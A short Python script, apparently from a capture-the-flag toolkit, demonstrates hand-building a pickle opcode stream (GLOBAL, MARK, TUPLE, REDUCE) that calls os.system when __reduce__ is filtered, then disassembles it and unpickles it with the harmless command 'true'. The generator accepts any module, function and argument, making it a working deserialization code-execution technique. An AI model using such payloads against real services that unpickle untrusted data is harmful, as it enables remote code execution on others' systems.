#!/usr/bin/env python3
"""Hand-build a pickle opcode stream when ``__reduce__`` is filtered.

Some jails inspect or strip opcodes. Then you assemble the stream yourself from
primitives. :func:`ctfkit.web.pickle_opcode_rce` emits
``GLOBAL module func`` / ``MARK`` / ``SHORT_BINUNICODE arg`` / ``TUPLE`` /
``REDUCE`` / ``STOP``. ``pickletools.dis`` shows exactly what the pickle VM will
execute -- read it like any other bytecode.
"""
import pickle
import pickletools

from ctfkit.web import pickle_opcode_rce

# os.system('true') -> loads cleanly and returns 0, a safe round-trip.
payload = pickle_opcode_rce("os", "system", "true")
print("raw bytes:", payload)
print("--- pickletools.dis ---")
pickletools.dis(payload)
print("pickle.loads(payload) returned:", pickle.loads(payload))
